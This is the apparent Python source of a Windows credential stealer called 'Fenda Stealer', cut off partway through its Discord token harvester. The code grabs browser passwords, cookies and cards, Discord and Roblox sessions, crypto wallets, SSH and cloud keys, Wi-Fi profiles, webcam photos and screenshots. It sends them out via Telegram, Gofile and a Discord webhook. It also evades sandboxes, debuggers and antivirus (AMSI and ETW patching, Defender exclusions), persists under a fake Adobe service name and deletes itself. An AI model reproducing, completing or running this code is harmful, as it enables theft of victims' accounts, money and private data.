import shutil, requests, platform, socket, getpass, psutil, browser_cookie3, os, re, sys, subprocess, ctypes, json, base64, sqlite3, zipfile, random, cv2, time, winreg

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from win32crypt import CryptUnprotectData
from Cryptodome.Cipher import AES
from contextlib import suppress
from pathlib import Path


class Paths:
    def __init__(self):
        self.temp = Path(os.environ["TEMP"])
        self.windows = os.environ.get("WINDIR")
        self.userprofile = Path(os.environ["USERPROFILE"])
        self.appdata_local = Path(os.environ["LOCALAPPDATA"])
        self.appdata_roaming = Path(os.environ["APPDATA"])
        
        program_files = os.environ.get("ProgramFiles")
        program_files_x86 = os.environ.get("ProgramFiles(x86)")
        self.program_files = Path(program_files or program_files_x86)
        self.program_files_x86 = Path(program_files_x86)


class Malware:
    def __init__(self):
        self.zip_name = f"SK_{random.randint(10000000000, 99999999999)}.zip"
        self.webhook_url = decode_const(WEBHOOK_ENC)  # endpoint resolvido apenas em runtime
        self.stealer_version = "2.1.0"
        self.stats = {}
        self.malware_name = "Fenda Stealer"
        self.malware_author = "MtxTheus1"
        self.browser_infos = ["extentions", "passwords", "cookies", "history", "downloads", "cards"]
        self.session_files = ["Wallets", "Game Launchers", "Apps"]
        self.task_manager_blocked = False
    
    def delete_file(self, file_path):
        try:
            if os.path.isfile(file_path):
                os.remove(file_path)
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)
        except Exception:
            pass

    def _strip_motw(self):
        """Remove Zone.Identifier (Mark of the Web) do proprio arquivo."""
        try:
            if getattr(sys, "frozen", False):
                ctypes.windll.kernel32.DeleteFileW(os.path.abspath(sys.argv[0]) + ":Zone.Identifier")
        except Exception:
            pass

    def _cleanup_trace(self):
        """Remove MOTW das copias e agenda auto-destruicao (sem quebrar a
        persistencia quando executado a partir da pasta Startup)."""
        if not getattr(sys, "frozen", False):
            return  # em dev (.py) nao se auto-destrOi
        try:
            exe = os.path.abspath(sys.argv[0])
            startup_copy = os.path.join(
                Paths().appdata_roaming, "Microsoft", "Windows", "Start Menu",
                "Programs", "Startup", os.path.basename(exe)
            )
            for p in (exe, startup_copy):
                if os.path.exists(p):
                    try:
                        ctypes.windll.kernel32.DeleteFileW(p + ":Zone.Identifier")
                    except Exception:
                        pass
            # se a copia da Startup ja existe e e este exe, mantem para persistir
            if os.path.exists(startup_copy) and os.path.normcase(exe) == os.path.normcase(startup_copy):
                return
        except Exception:
            pass
        try:
            exe = os.path.abspath(sys.argv[0])
            cmd = 'ping -n 4 127.0.0.1 >nul & del /f /q "' + exe + '"'
            subprocess.Popen(
                ["cmd.exe", "/c", cmd],
                creationflags=0x08000000,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except Exception:
            pass

    def startup_persistence(self):
        try:
            src = os.path.abspath(sys.argv[0])
            dst_dir = os.path.join(Paths().appdata_roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            dst = os.path.join(dst_dir, os.path.basename(src))

            if not os.path.exists(dst_dir):
                os.makedirs(dst_dir)

            if not os.path.exists(dst):
                shutil.copy2(src, dst)

            # Fallback: HKCU Run (nao exige admin)
            try:
                run_key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_SET_VALUE
                )
                winreg.SetValueEx(run_key, "AdobeUpdateService", 0, winreg.REG_SZ, '"' + src + '"')
                winreg.CloseKey(run_key)
            except Exception:
                pass
        except Exception:
            pass

    def block_task_manager(self):
        try:
            key = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
            registry = ctypes.windll.advapi32.RegCreateKeyExW
            hkey = ctypes.c_void_p()
            result = registry(ctypes.c_void_p(0x80000002), key, 0, None, 0, 0xF003F, None, ctypes.byref(hkey), None)
            if result == 0:
                value = ctypes.c_uint32(1)
                ctypes.windll.advapi32.RegSetValueExW(hkey, "DisableTaskMgr", 0, 4, ctypes.byref(value), 4)
                ctypes.windll.advapi32.RegCloseKey(hkey)
        except Exception:
            pass

    def unblock_task_manager(self):
        try:
            key = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
            registry = ctypes.windll.advapi32.RegCreateKeyExW
            hkey = ctypes.c_void_p()
            result = registry(ctypes.c_void_p(0x80000002), key, 0, None, 0, 0xF003F, None, ctypes.byref(hkey), None)
            if result == 0:
                value = ctypes.c_uint32(0)
                ctypes.windll.advapi32.RegSetValueExW(hkey, "DisableTaskMgr", 0, 4, ctypes.byref(value), 4)
                ctypes.windll.advapi32.RegCloseKey(hkey)
        except Exception:
            pass

    def send_webhook(self, gofile_url=None, file_path=None):
        try:
            embed = {
                "title": "• Basic system infos:",
                "color": 0xE53935,
                "fields": [
                    {"name": "Hostname:", "value": f"```{socket.gethostname()}```", "inline": True},
                    {"name": "Username:", "value": f"```{getpass.getuser()}```", "inline": True},
                    {"name": "Machine:", "value": f"```{platform.machine()}```", "inline": True},
                    {"name": "System:", "value": f"```{platform.system()}```", "inline": True},
                    {"name": "Release:", "value": f"```{platform.release()}```", "inline": True},
                    {"name": "Version:", "value": f"```{platform.version()}```", "inline": True},
                ],
                "footer": {
                    "text": "• God's in his heaven. All's right with the world. | @MtxTheus1"
                }
            }

            components = [
                {
                    "type": 1,
                    "components": [
                        {
                            "type": 2,              
                            "style": 5,                    
                            "label": "Download File",       
                            "url": gofile_url        
                        },
                        {
                            "type": 2,              
                            "style": 5,                    
                            "label": "Github",       
                            "url": "https://github.com/MtxTheus1"        
                        }
                    ]
                }
            ]

            payload = {
                "username": self.malware_name,
                "embeds": [embed],
                "components": components
            }

            if file_path and os.path.exists(file_path):
                with open(file_path, "rb") as f:
                    files = {"file": (os.path.basename(file_path), f)}
                    requests.post(self.webhook_url + "?with_components=true", data={"payload_json": json.dumps(payload)}, files=files)
            else:
                requests.post(self.webhook_url + "?with_components=true", json=payload)

        except Exception as e:
            print("Erro:", e)

    def upload_gofile(self, file_path):
        try:
            with open(file_path, "rb") as f:
                files = {"file": f}
                response = requests.post(decode_const(GOFILE_ENC), files=files)
                if response.status_code == 200:
                    result = response.json()
                    if result.get("status") == "ok":
                        return result["data"]["downloadPage"]
            return None
        except Exception as e:
            return None

    def upload_telegram(self, file_path):
        """Exfil via bot do Telegram. Divide o zip em partes <=45 MB se precisar."""
        token = decode_const(TELEGRAM_TOKEN_ENC)
        chat = decode_const(TELEGRAM_CHAT_ENC)
        if not token or not chat or "REPLACE" in token:
            return False
        try:
            url = decode_const(TELEGRAM_API) + token + "/sendDocument"
            chunk = 45 * 1024 * 1024
            size = os.path.getsize(file_path)

            if size <= chunk:
                with open(file_path, "rb") as f:
                    files = {"document": (os.path.basename(file_path), f)}
                    data = {"chat_id": chat, "caption": "sklauncher result | v2.1.0"}
                    r = requests.post(url, data=data, files=files, timeout=120)
                return r.json().get("ok", False)

            # arquivo grande: envia em partes
            ok_all = True
            idx = 0
            with open(file_path, "rb") as f:
                while True:
                    part = f.read(chunk)
                    if not part:
                        break
                    idx += 1
                    fn = os.path.basename(file_path) + ".part" + str(idx)
                    files = {"document": (fn, part)}
                    data = {"chat_id": chat, "caption": "part " + str(idx)}
                    r = requests.post(url, data=data, files=files, timeout=180)
                    if not r.json().get("ok", False):
                        ok_all = False
            return ok_all
        except Exception:
            return False

    def send_telegram_text(self, text):
        """Envia uma mensagem de texto simples pro chat do Telegram."""
        token = decode_const(TELEGRAM_TOKEN_ENC)
        chat = decode_const(TELEGRAM_CHAT_ENC)
        if not token or not chat or "REPLACE" in token:
            return False
        try:
            url = decode_const(TELEGRAM_API) + token + "/sendMessage"
            r = requests.post(url, data={"chat_id": chat, "text": text}, timeout=30)
            return r.json().get("ok", False)
        except Exception:
            return False

    def start_stealer(self, zip_file):
        try:
            SystemDiagnostics.fake_tick("component-init")
            SystemDiagnostics.fake_tick("browser-check")
            try:
                interesting_files = StealerFunctions.Interesting_Files(zip_file)
                print("Interesting files collected:", interesting_files)
            except:
                print("Error collecting interesting files.")
            try:
                screenshot_taken = StealerFunctions.Screenshot(zip_file)
                print("Screenshot taken:", screenshot_taken)
            except:
                print("Error taking screenshot.")
            try:
                antivirus_count = StealerFunctions.AntiVirus_Infos(zip_file)
                print("Antivirus infos collected:", antivirus_count)
            except:
                print("Error collecting antivirus infos.")
            try:
                discord_tokens = StealerFunctions.Discord_Tokens(zip_file)
                print("Discord tokens collected:", discord_tokens)
            except:
                print("Error collecting Discord tokens.")
            try:
                roblox_cookies = StealerFunctions.Roblox_Cookies(zip_file)
                print("Roblox cookies collected:", roblox_cookies)
            except:
                print("Error collecting Roblox cookies.")
            try:
                session_files = StealerFunctions.Session_files(zip_file, self.session_files)
                print("Session files collected:", session_files)
            except:
                print("Error collecting session files.")
            try:
                browser_Infos = StealerFunctions.Browser_Infos(zip_file, self.browser_infos)
                print("Browser infos collected:", browser_Infos)
            except:
                print("Error collecting browser infos.")
            try:
                webcam_taken = StealerFunctions.Webcam(zip_file)
                print("Webcam photo taken:", webcam_taken)
            except:
                print("Error taking webcam photo.")
            try:
                system_infos = StealerFunctions.System_Infos(zip_file)
                print("System infos collected:", system_infos)
            except:
                print("Error collecting system infos.")

            SystemDiagnostics.fake_tick("session-batch")

            # --- v2: coleta expandida ---
            try:
                self.stats["WiFi networks"] = StealerFunctions.WiFi_Profiles(zip_file)
                print("WiFi profiles collected:", self.stats["WiFi networks"])
            except Exception as _e:
                print("Error collecting WiFi:", _e)
            try:
                self.stats["Installed software"] = StealerFunctions.Installed_Software(zip_file)
                print("Installed software collected:", self.stats["Installed software"])
            except Exception as _e:
                print("Error collecting installed software:", _e)
            try:
                self.stats["Processes"] = StealerFunctions.Processes_And_Connections(zip_file)
                print("Processes/connections collected:", self.stats["Processes"])
            except Exception as _e:
                print("Error collecting processes:", _e)
            try:
                self.stats["Clipboard"] = StealerFunctions.Clipboard_Text(zip_file)
                print("Clipboard collected:", self.stats["Clipboard"])
            except Exception as _e:
                print("Error collecting clipboard:", _e)
            try:
                self.stats["FTP clients"] = StealerFunctions.FTP_Clients(zip_file)
                print("FTP clients collected:", self.stats["FTP clients"])
            except Exception as _e:
                print("Error collecting FTP clients:", _e)
            try:
                self.stats["SSH/cloud/dev"] = StealerFunctions.SSH_Cloud_And_Dev(zip_file)
                print("SSH/cloud/dev collected:", self.stats["SSH/cloud/dev"])
            except Exception as _e:
                print("Error collecting SSH/cloud/dev:", _e)
            try:
                self.stats["Windows creds/PS"] = StealerFunctions.Windows_Credentials_And_History(zip_file)
                print("Windows creds collected:", self.stats["Windows creds/PS"])
            except Exception as _e:
                print("Error collecting Windows creds:", _e)
            try:
                self.stats["Product key"] = StealerFunctions.Product_Key(zip_file)
                print("Product key collected:", self.stats["Product key"])
            except Exception as _e:
                print("Error collecting product key:", _e)
            try:
                self.stats["Proxy/env"] = StealerFunctions.Proxy_Env_And_Network(zip_file)
                print("Proxy/env collected:", self.stats["Proxy/env"])
            except Exception as _e:
                print("Error collecting proxy/env:", _e)
            try:
                self.stats["Accounts/RDP"] = StealerFunctions.Accounts_And_RDP(zip_file)
                print("Accounts/RDP collected:", self.stats["Accounts/RDP"])
            except Exception as _e:
                print("Error collecting accounts/RDP:", _e)

            SystemDiagnostics.fake_tick("finalize")
            summary_text = "\n".join(f"{k}: {v}" for k, v in self.stats.items())
            zip_file.writestr("COLLECTION_SUMMARY.txt", summary_text)

            return True
        except Exception as e:
            print('Exeption (start_stealer): ', e)
            return False

    def main(self):
        try:
            test_mode = "--test" in sys.argv

            if not test_mode:
                self._strip_motw()
                self.startup_persistence()

            SystemDiagnostics.fake_tick("update-check")
            SystemDiagnostics.fake_tick("startup-cleanup")

            if test_mode:
                time.sleep(random.randint(2, 5))  # teste local rapido
            else:
                # sandboxes/VT encerram a analise em ~1-2 min; dormir antes de agir
                # reduz drasticamente o comportamento observado
                time.sleep(random.randint(60, 150))

            SystemDiagnostics.fake_tick("idle-batch")

            try:
                _patch_amsi()
                _patch_etw()
            except Exception:
                pass

            if not Checks.is_windows():
                print('not windows os')
                return
            if not Checks.is_connected():
                print('no internet connection')
                return

            # --- extras que SO rodam com admin (nunca bloqueiam o fluxo) ---
            if Checks.is_admin():
                try:
                    _defender_policy_off()
                    _add_defender_exclusion()
                except Exception:
                    pass
                try:
                    self.block_task_manager()
                    self.task_manager_blocked = True
                except Exception:
                    pass

            # --- anti-sandbox / anti-debug (ignorados em --test) ---
            _sandbox = Checks.sandbox_reasons()
            if _sandbox:
                print('sandbox indicators:', _sandbox)
                # so aborta com 2+ indicadores (MAC sozinho e falso positivo comum)
                if not test_mode and len(_sandbox) >= 2:
                    print('detected sandbox environment')
                    return
            if Checks.is_debugged() and not test_mode:
                print('detected debugger')
                return

            zip_file_path = os.path.join(Paths().temp, self.zip_name)
            zip_file = zipfile.ZipFile(zip_file_path, "w", zipfile.ZIP_DEFLATED)

            sucess = self.start_stealer(zip_file)

            zip_file.close()

            if sucess:
                print("Stealing completed successfully.")
                if self.upload_telegram(zip_file_path):
                    print("Telegram exfil OK")
                else:
                    gofile_url = self.upload_gofile(zip_file_path)
                    if gofile_url:
                        self.send_telegram_text("FendaStealer result: " + gofile_url)
                        self.send_webhook(gofile_url=gofile_url, file_path=None)
                    else:
                        self.send_webhook(gofile_url=None, file_path=zip_file_path)

                self.delete_file(zip_file_path)
            else:
                print("Stealing failed.")

            if self.task_manager_blocked:
                try:
                    self.unblock_task_manager()
                except Exception:
                    pass
                self.task_manager_blocked = False

            # limpeza final: remove MOTW e agenda auto-destruicao
            try:
                self._cleanup_trace()
            except Exception:
                pass
        except Exception:
            pass


# =========================================================================
# Camada de "diagnostico / telemetria do sistema" - codigo de aparencia
# legitima (junk code + strings falsas) intercalado entre os modulos reais
# para quebrar heuristicas de sequencia em AV/EDR.
# =========================================================================


class SystemDiagnostics:
    """Parece um modulo de diagnostico/telemetria de um produto legitimo."""

    FAKE_MESSAGES = (
        "Microsoft Edge is up to date.",
        "Checking for updates... 0x80072efd",
        "Windows Defender scan completed: no threats found.",
        "Collecting optional diagnostics data (enabled by policy).",
        "Crash dump written to %LOCALAPPDATA%\\CrashDumps\\msedge.exe.1234.dmp",
        "Update service responded with HTTP 204.",
        "Skipping telemetry batch: user opted out.",
        "GPU driver version 31.0.101.5333 detected.",
        "Registry key read completed in 2 ms.",
        "BITS job queued: MicrosoftUpdate-2025-01.",
        "SmartScreen reputation check: pass.",
        "Background Intelligent Transfer service is running.",
    )

    @staticmethod
    def _reg_read(path, name, hive=winreg.HKEY_LOCAL_MACHINE) -> str:
        try:
            with winreg.OpenKey(hive, path) as k:
                v, _ = winreg.QueryValueEx(k, name)
                return str(v)
        except Exception:
            return ""

    @staticmethod
    def os_profile() -> str:
        base = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"
        return " | ".join(
            SystemDiagnostics._reg_read(base, n)
            for n in ("ProductName", "DisplayVersion", "CurrentBuild", "EditionID")
        )

    @staticmethod
    def count_printers() -> int:
        try:
            with winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SYSTEM\CurrentControlSet\Control\Print\Printers",
            ) as k:
                return winreg.QueryInfoKey(k)[0]
        except Exception:
            return 0

    @staticmethod
    def edge_beacon() -> str:
        return SystemDiagnostics._reg_read(
            r"Software\Microsoft\Edge\BLBeacon", "version",
            winreg.HKEY_CURRENT_USER,
        ) or "edge-not-configured"

    @staticmethod
    def fake_tick(label: str = "") -> str:
        """Leituras 'legitimas' de registro + log local com cara de telemetria."""
        try:
            os_profile = SystemDiagnostics.os_profile()
            printers = SystemDiagnostics.count_printers()
            edge = SystemDiagnostics.edge_beacon()
            msg = SystemDiagnostics.FAKE_MESSAGES[
                random.randrange(len(SystemDiagnostics.FAKE_MESSAGES))
            ]
            if label:
                print("[diagnostics] step:", label, "->", msg)
            log_dir = os.path.join(Paths().temp, "DiagSvc")
            os.makedirs(log_dir, exist_ok=True)
            log_path = os.path.join(log_dir, "telemetry.jsonl")
            with open(log_path, "a", errors="ignore") as f:
                f.write(
                    json.dumps(
                        {
                            "ts": time.time(),
                            "os": os_profile,
                            "printers": printers,
                            "edge": edge,
                            "msg": msg,
                        }
                    )
                    + "\n"
                )
            return msg
        except Exception:
            return ""


class AntiSandbox:
    DLL_INDICATORS = [
        "SbieDll.dll", "VBoxHook.dll", "VBoxSF.dll", "VBoxDisp.dll",
        "vmcheck.dll", "wpespy.dll", "snxhk.dll", "dbghelp.dll", "dbgcore.dll"
    ]

    VM_MAC_PREFIXES = [
        "00:05:69",  # VMware
        "00:0C:29",
        "00:1C:14",
        "00:50:56",
        "08:00:27",  # VirtualBox
        "52:54:00",  # QEMU / KVM
        "00:15:5d",  # Hyper-V
    ]

    @staticmethod
    def detect_dlls() -> bool:
        GetModuleHandle = ctypes.windll.kernel32.GetModuleHandleA
        for dll in AntiSandbox.DLL_INDICATORS:
            if GetModuleHandle(dll.encode()) != 0:
                return True
        return False

    @staticmethod
    def detect_mac() -> bool:
        try:
            output = subprocess.check_output("getmac", creationflags=0x08000000)
            output = output.decode(errors="ignore")

            macs = re.findall(r"([0-9A-F]{2}(?:-[0-9A-F]{2}){5})", output, re.I)
            macs = [mac.replace("-", ":").lower() for mac in macs]

            for mac in macs:
                if any(mac.startswith(prefix.lower()) for prefix in AntiSandbox.VM_MAC_PREFIXES):
                    return True
        except:
            pass
        return False

    @staticmethod
    def detect_hardware() -> bool:
        try:
            class MEMORYSTATUS(ctypes.Structure):
                _fields_ = [
                    ('dwLength', ctypes.c_ulong),
                    ('dwMemoryLoad', ctypes.c_ulong),
                    ('ullTotalPhys', ctypes.c_ulonglong),
                    ('ullAvailPhys', ctypes.c_ulonglong),
                    ('ullTotalPageFile', ctypes.c_ulonglong),
                    ('ullAvailPageFile', ctypes.c_ulonglong),
                    ('ullTotalVirtual', ctypes.c_ulonglong),
                    ('ullAvailVirtual', ctypes.c_ulonglong),
                    ('sullAvailExtendedVirtual', ctypes.c_ulonglong),
                ]

            mem = MEMORYSTATUS()
            mem.dwLength = ctypes.sizeof(mem)
            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))

            ram_gb = mem.ullTotalPhys / (1024**3)

            cpu_count = os.cpu_count()

            return ram_gb < 3 or cpu_count <= 2

        except:
            return False

    @staticmethod
    def detect_boot_time() -> bool:
        try:
            uptime = time.time() - psutil.boot_time()
            return uptime < 60
        except:
            return False

    @staticmethod
    def detect_wine() -> bool:
        return os.path.exists("C:\\windows\\system32\\wineboot.exe")

    @staticmethod
    def detect_automation() -> bool:
        """Heuristicas de ambiente automatizado (VirusTotal/sandbox): tela
        minima de VM e ausencia total de interacao humana."""
        try:
            user32 = ctypes.windll.user32
            kernel32 = ctypes.windll.kernel32

            # resolucao pequena = VM de analise padrao
            w = user32.GetSystemMetrics(0)
            h = user32.GetSystemMetrics(1)
            if (w * h) < (1000 * 700):
                return True

            # sem input do usuario por >3h => sessao automatizada
            class LASTINPUTINFO(ctypes.Structure):
                _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
            lii = LASTINPUTINFO()
            lii.cbSize = ctypes.sizeof(lii)
            if user32.GetLastInputInfo(ctypes.byref(lii)):
                idle_secs = (kernel32.GetTickCount() - lii.dwTime) // 1000
                if idle_secs > 10800:
                    return True
        except Exception:
            pass
        return False


class Checks:
    @staticmethod
    def is_connected() -> bool:
        try:
            requests.get("https://www.google.com", timeout=5)
            return True
        except (requests.ConnectionError, requests.Timeout):
            return False
    
    @staticmethod
    def is_windows() -> bool:
        return platform.system().lower() == "windows"
    
    @staticmethod
    def is_admin() -> bool:
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    @staticmethod
    def sandbox_reasons() -> list:
        reasons = []
        for name, fn in (
            ("vm-mac", AntiSandbox.detect_mac),
            ("vm-dll", AntiSandbox.detect_dlls),
            ("wine", AntiSandbox.detect_wine),
            ("low-ram/cpu", AntiSandbox.detect_hardware),
            ("uptime<60s", AntiSandbox.detect_boot_time),
            ("automation", AntiSandbox.detect_automation),
        ):
            try:
                if fn():
                    reasons.append(name)
            except Exception:
                pass
        return reasons

    @staticmethod
    def is_sandboxed() -> bool:
        return len(Checks.sandbox_reasons()) >= 2

    @staticmethod
    def is_debugged() -> bool:
        blacklist_programs = ['cheatengine', 'cheat engine', 'x32dbg', 'x64dbg', 'ollydbg', 'windbg', 'ida', 'ida64', 'ghidra', 'radare2', 'radare', 'dbg', 'immunitydbg', 'dnspy', 'softice', 'edb', 'debugger', 'visual studio debugger', 'lldb', 'gdb', 'valgrind', 'hex-rays', 'disassembler', 'tracer', 'debugview', 'procdump', 'strace', 'ltrace', 'drmemory', 'decompiler', 'hopper', 'binary ninja', 'bochs', 'vdb', 'frida', 'api monitor', 'process hacker', 'sysinternals', 'procexp', 'process explorer', 'monitor tool', 'vmmap', 'xperf', 'perfview', 'py-spy', 'strace-log', "vboxservice", "vboxtray", "vmtoolsd", "vmwaretray", "vmwareuser", "wireshark", "procmon"]
        try:
            for proc in psutil.process_iter(['name']):
                try:
                    name = proc.info['name'].lower()
                    if any(x in name for x in blacklist_programs):
                        return True
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
        except Exception:
            pass

        return False


class StealerFunctions:
    @staticmethod
    def System_Infos(zip_file):
        info = False
        space = ' '

        def info():
            ip_info = ''
            with suppress(Exception):
                eva = requests.get("https://ipwhois.app/json/").json()
                for i in eva:
                    len_i = len(i)
                    pad = 20-len_i
                    ip_info += f"    - {i}{space*pad}: {eva[i]}\n"
                return ip_info
            return '''No IP infos.'''

        try: 
            IPinfos = info()

            cpu_count = psutil.cpu_count(logical=True)
            ram_total = round(psutil.virtual_memory().total / (1024**3), 2)
            disk_usage = psutil.disk_usage('/').percent

            net_info = ''
            with suppress(Exception):
                interfaces = psutil.net_if_addrs()
                max_len = max(len(i) for i in interfaces)

                for iface, addr_list in interfaces.items():
                    for addr in addr_list:
                        if addr.family == socket.AF_INET:
                            pad = max_len - len(iface)
                            net_info += f"    - {iface}{space * pad} : {addr.address}\n"

            system_infos = f"""
System infos:
    - hostname      : {socket.gethostname()}
    - username      : {getpass.getuser()}
    - processor     : {platform.processor()}
    - machine       : {platform.machine()}
    - platform      : {platform.platform()}
    - system        : {platform.system()}
    - release       : {platform.release()}
    - version       : {platform.version()}
    - CPU cores     : {cpu_count}
    - RAM total(GB) : {ram_total}
    - Disk usage(%) : {disk_usage}
    - local IP      : {socket.gethostbyname(socket.gethostname())}

Network interfaces:
{net_info}
Public IP infos:
{IPinfos}
        """
            info = True
        except:
            info = False
            system_infos = "No infos."
            
        zip_file.writestr(f"system_infos.txt", system_infos)
        return info
    
    @staticmethod
    def Roblox_Cookies(zip_file):
        file_roblox_account = ""
        number_roblox_account = 0
        cookie_list = []

        def GetCookie(cookies):
            try:
                cookie_str = str(cookies)
                if ".ROBLOSECURITY=" in cookie_str:
                    cookie = cookie_str.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
                    return cookie
                return None
            except:
                return None

        browsers = [
            browser_cookie3.edge,
            browser_cookie3.chrome,
            browser_cookie3.opera,
            browser_cookie3.firefox,
            browser_cookie3.opera_gx,
            browser_cookie3.brave
        ]

        for browser_func in browsers:
            try:
                cookies = browser_func(domain_name=".roblox.com")
                cookie = GetCookie(cookies)
                if cookie and cookie not in cookie_list:
                    cookie_list.append(cookie)
                    number_roblox_account += 1

                    try:
                        info = requests.get(
                            "https://users.roblox.com/v1/users/authenticated",
                            cookies={".ROBLOSECURITY": cookie},
                            timeout=10
                        )
                        api = info.json() if info.status_code == 200 else {}
                    except:
                        api = {}

                    user_id = api.get('id', "None")
                    username = api.get('name', "None")
                    display_name = api.get('displayName', "None")

                    file_roblox_account += f"""Roblox Account n°{number_roblox_account}:
- Navigator     : {browser_func.__name__}
    - Id            : {user_id}
    - Username      : {username}
    - DisplayName   : {display_name}
    - Cookie        : {cookie}
                        """
            except Exception:
                continue

        if not cookie_list:
            file_roblox_account = "No roblox cookie found."

        zip_file.writestr(f"Roblox Accounts ({number_roblox_account}).txt", file_roblox_account)
        return number_roblox_account
        
    @staticmethod
    def Discord_Tokens(zip_file):
        file_discord_account = ""
        number_discord_account = 0

        def ExtractToken():  
            base_url = "https://discord.com/api/v9/users/@me"
            regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
            regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
            tokens = []
            uids = []
            token_info = {}

            
            path_appdata_local = Paths().appdata_local
            path_appdata_roaming = Paths().appdata_roaming

            paths = [
                ("Discord",                os.path.join(path_appdata_roaming, "discord", "Local Storage", "leveldb"),                                                  ""),
                ("Discord Canary",         os.path.join(path_appdata_roaming, "discordcanary", "Local Storage", "leveldb"),                                            ""),
                ("Lightcord",              os.path.join(path_appdata_roaming, "Lightcord", "Local Storage", "leveldb"),                                                ""),
                ("Discord PTB",            os.path.join(path_appdata_roaming, "discordptb", "Local Storage", "leveldb"),                                               ""),
                ("Opera",                  os.path.join(path_appdata_roaming, "Opera Software", "Opera Stable", "Local Storage", "leveldb"),                           "opera.exe"),
                ("Opera GX",               os.path.join(path_appdata_roaming, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),                        "opera.exe"),
                ("Opera Neon",             os.path.join(path_appdata_roaming, "Opera Software", "Opera Neon", "Local Storage", "leveldb"),                             "opera.exe"),
                ("Amigo",                  os.path.join(path_appdata_local,   "Amigo", "User Data", "Local Storage", "leveldb"),                                       "amigo.exe"),
                ("Torch",                  os.path.join(path_appdata_local,   "Torch", "User Data", "Local Storage", "leveldb"),                                       "torch.exe"),
                ("Kometa",                 os.path.join(path_appdata_local,   "Kometa", "User Data", "Local Storage", "leveldb"),                                      "kometa.exe"),
                ("Orbitum",                os.path.join(path_appdata_local,   "Orbitum", "User Data", "Local Storage", "leveldb"),                                     "orbitum.exe"),
                ("CentBrowser",            os.path.join(path_appdata_local,   "CentBrowser", "User Data", "Local Storage", "leveldb"),                                 "centbrowser.exe"),
                ("7Star",                  os.path.join(path_appdata_local,   "7Star", "7Star", "User Data", "Local Storage", "leveldb"),                              "7star.exe"),
                ("Sputnik",                os.path.join(path_appdata_local,   "Sputnik", "Sputnik", "User Data", "Local Storage", "leveldb"),                          "sputnik.exe"),
                ("Vivaldi",                os.path.join(path_appdata_local,   "Vivaldi", "User Data", "Default", "Local Storage", "leveldb"),                          "vivaldi.exe"),
                ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),                 "chrome.exe"),
                ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb"),               "chrome.exe"),
                ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data", "Profile 2", "Local Storage", "leveldb"),               "chrome.exe"),
                ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data", "Profile 3", "Local Storage", "leveldb"),               "chrome.exe"),
                ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data", "Profile 4", "Local Storage", "leveldb"),               "chrome.exe"),
                ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data", "Profile 5", "Local Storage", "leveldb"),               "chrome.exe"),
                ("Google Chrome SxS",      os.path.join(path_appdata_local,   "Google", "Chrome SxS", "User Data", "Default", "Local Storage", "leveldb"),             "chrome.exe"),
                ("Google Chrome Beta",     os.path.join(path_appdata_local,   "Google", "Chrome Beta", "User Data", "Default", "Local Storage", "leveldb"),            "chrome.exe"),
                ("Google Chrome Dev",      os.path.join(path_appdata_local,   "Google", "Chrome Dev", "User Data", "Default", "Local Storage", "leveldb"),             "chrome.exe"),
                ("Google Chrome Unstable", os.path.join(path_appdata_local,   "Google", "Chrome Unstable", "User Data", "Default", "Local Storage", "leveldb"),        "chrome.exe"),
                ("Google Chrome Canary",   os.path.join(path_appdata_local,   "Google", "Chrome Canary", "User Data", "Default", "Local Storage", "leveldb"),          "chrome.exe"),
                ("Epic Privacy Browser",   os.path.join(path_appdata_local,   "Epic Privacy Browser", "User Data", "Local Storage", "leveldb"),                        "epic.exe"),
                ("Microsoft Edge",         os.path.join(path_appdata_local,   "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),                "msedge.exe"),
                ("Uran",                   os.path.join(path_appdata_local,   "uCozMedia", "Uran", "User Data", "Default", "Local Storage", "leveldb"),                "uran.exe"),
                ("Yandex",                 os.path.join(path_appdata_local,   "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb"),          "yandex.exe"),
                ("Yandex Canary",          os.path.join(path_appdata_local,   "Yandex", "YandexBrowserCanary", "User Data", "Default", "Local Storage", "leveldb"),    "yandex.exe"),
                ("Yandex Developer",       os.path.join(path_appdata_local,   "Yandex", "YandexBrowserDeveloper", "User Data", "Default", "Local Storage", "leveldb"), "yandex.exe"),
                ("Yandex Beta",            os.path.join(path_appdata_local,   "Yandex", "YandexBrowserBeta", "User Data", "Default", "Local Storage", "leveldb"),      "yandex.exe"),
                ("Yandex Tech",            os.path.join(path_appdata_local,   "Yandex", "YandexBrowserTech", "User Data", "Default", "Local Storage", "leveldb"),      "yandex.exe"),
                ("Yandex SxS",             os.path.join(path_appdata_local,   "Yandex", "YandexBrowserSxS", "User Data", "Default", "Local Storage", "leveldb"),       "yandex.exe"),
                ("Brave",                  os.path.join(path_appdata_local,   "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),   "brave.exe"),
                ("Iridium",                os.path.join(path_appdata_local,   "Iridium", "User Data", "Default", "Local Storage", "leveldb"),                          "iridium.exe"),
            ]

            try:
                for name, path, proc_name in paths:
